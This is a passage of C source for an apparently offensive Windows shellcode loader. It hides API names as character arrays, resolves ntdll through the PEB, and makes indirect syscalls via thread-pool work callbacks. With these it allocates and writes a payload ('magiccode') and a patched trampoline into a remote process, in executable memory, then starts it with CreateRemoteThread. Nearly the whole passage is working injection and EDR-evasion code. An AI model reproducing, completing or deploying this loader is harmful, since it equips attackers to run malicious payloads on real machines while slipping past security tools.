    }

    // -bin
    if (binPath) {
        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
            fprintf(stderr, "[-] Failed to read binary file\n");
        } else {
            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
        }
    } else {
        magic_code = magiccode; 
        allocatedSize = sizeof(magiccode);
        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
    }
    // -bin

    printf("\033[32m[+] press any key to continue\033[0m\n");
    getchar();

    PVOID allocatedAddress = NULL;


    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[0], magic_code[1], magic_code[2], magic_code[3], magic_code[4], magic_code[5], magic_code[6], magic_code[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[sizeof(magic_code) - 8], magic_code[sizeof(magic_code) - 7], magic_code[sizeof(magic_code) - 6], magic_code[sizeof(magic_code) - 5], magic_code[sizeof(magic_code) - 4], magic_code[sizeof(magic_code) - 3], magic_code[sizeof(magic_code) - 2], magic_code[sizeof(magic_code) - 1]);


	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    wchar_t wideLibName[32] = {0};

    for (int i = 0; libName[i] != 0; i++) {
        wideLibName[i] = (wchar_t)libName[i];
    }

	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char TpAllocFuture[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k', 0 };
    const char TpPostFuture[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k', 0 };
    const char TpReleaseFuture[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0 };

    // HMODULE ntdllMod = GetModuleHandleA(libName);
    HMODULE ntdllMod = (HMODULE)DLLViaPEB(wideLibName);
    PVOID allocateFuture = GetFunctionAddress(NtAllocateFuture, ntdllMod);

    PVOID syscallAddr1 = findSyscallInstruction(NtAllocateFuture, (FARPROC)allocateFuture, 1);
    
    SSNAllocateVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)allocateFuture);
    if(SSNAllocateVirtualMemory) {
        printf("[+] Found syscall number: %d\n", SSNAllocateVirtualMemory);
    } else {
        printf("[-] Failed to find syscall number\n");
    }


    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) syscallAddr1;
    ntAllocateVirtualMemoryArgs.hProcess = pi.hProcess;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;

    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(ntdllMod, TpAllocFuture);
    FARPROC pTpPostWork = GetProcAddress(ntdllMod, TpPostFuture);
    FARPROC pTpReleaseWork = GetProcAddress(ntdllMod, TpReleaseFuture);

    PTP_WORK WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

    printf("[*] allocatedAddress: %p\n", allocatedAddress);
    if(allocatedSize != sizeof(magiccode)) {
        printf("[*] Allocated size is not the same as magiccode size\n");
        printf("[*] Allocated size: %lu\n", allocatedSize);
        printf("[*] MagicCode size: %lu\n", sizeof(magiccode));
    }



	///Write process memory: 
    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    PVOID writeFuture = GetFunctionAddress(NtWriteFuture, ntdllMod);
    PVOID syscallAddr2 = findSyscallInstruction(NtWriteFuture, (FARPROC)writeFuture, 1);
    SSNWriteVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)writeFuture);
    

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) syscallAddr2;
    ntWriteVirtualMemoryArgs.hProcess = pi.hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magic_code;
    ntWriteVirtualMemoryArgs.size = allocatedSize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    printf("Bytes written: %lu\n", bytesWritten);

    if(WorkReturn2 == NULL) {
        printf("[-] Failed to write memory\n");
    } else {
        printf("[+] Memory written\n");
    }


    // Change protection: 
    // DWORD oldProtect;
    // bool results = VirtualProtectEx(pi.hProcess, allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
    // if(results) {
    //     printf("[+] VirtualProtectEx success\n");
    // } else {
    //     DWORD error = GetLastError();
    //     printf("[-] VirtualProtectEx failed with error code %lu\n", error);
    // }


    /// Allocate space for trampoline code: 

    LPVOID trampolineAddr = NULL;
    
    SIZE_T trampolineSize = sizeof(trampoline) + SIZE_T(0x0000000000004000);
    ntAllocateVirtualMemoryArgs.address = &trampolineAddr;
    ntAllocateVirtualMemoryArgs.size = &trampolineSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    PTP_WORK WorkReturn3 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);

    printf("[+] Allocated memory for trampoline in remote process\n");
    printf("[+] trampolineAddr in remote process: 0x%p\n", trampolineAddr);
    printf("[*] trampoline Size: %lu\n", trampolineSize);
    printf("[+] MagicCode size: %lu\n", sizeof(magiccode));


    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x88\x88\x88\x88\x88\x88\x88\x88", (PCHAR)"xxxxxxxx");
    // LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");

    printf("[+] Found restoreExInTrampoline at: 0x%p\n", restoreExInTrampoline);
    memcpy(restoreExInTrampoline, &allocatedAddress, 8);
    //print the address of trampolineEx
    BOOL result = FlushInstructionCache(pi.hProcess, NULL, 0);
    if(result) {
        printf("[+] FlushInstructionCache success\n");
    } else {
        DWORD error = GetLastError();
        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
    }

    LPVOID sizeExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");
    printf("[+] Found sizeExInTrampoline at: 0x%p\n", sizeExInTrampoline);
    // // we need to ensure allocatedSize is of 4 bytes size, we can use memcpy to copy the 4 bytes to the trampoline:
    memcpy(sizeExInTrampoline, &allocatedSize, sizeof(SIZE_T));
    // memcpy(sizeExInTrampoline, &allocatedSize, 8);
    // call FlushInstructionCache
    result = FlushInstructionCache(pi.hProcess, NULL, 0);
    if(result) {
        printf("[+] FlushInstructionCache success\n");
    } else {
        DWORD error = GetLastError();
        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
    }

    // Create a trampoline code with space in between. 
    PVOID trampolineEx = (BYTE*)trampolineAddr + SIZE_T(0x0000000000004000);

    ntWriteVirtualMemoryArgs.address = trampolineEx;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)trampoline;
    ntWriteVirtualMemoryArgs.size = sizeof(trampoline);
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);


    //####END####


    // 1. Creating a remote thread in the target process to execute the magiccode
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)trampolineEx, NULL, 0, NULL);

    // // instead of create a remote thread point to the shellcode, it point to a random address:
    // hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0x12345678, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed (%d).\n", GetLastError());
        return 0;
    } else {
        printf("[+] magiccode execution started\n");
    }

    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(pi.hProcess, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }


    // SimpleSleep(15000000);
    // getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}

BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
{
    FILE* f = NULL;
    _wfopen_s(&f, Filepath, L"rb");
    if (!f) {
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        return FALSE;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, f);
    fclose(f);

    if (bytesRead != fileSize) {
        free(buffer);
        return FALSE;
    }

    *magiccode = buffer;
    *magiccodeSize = (SIZE_T)fileSize;
    return TRUE;
}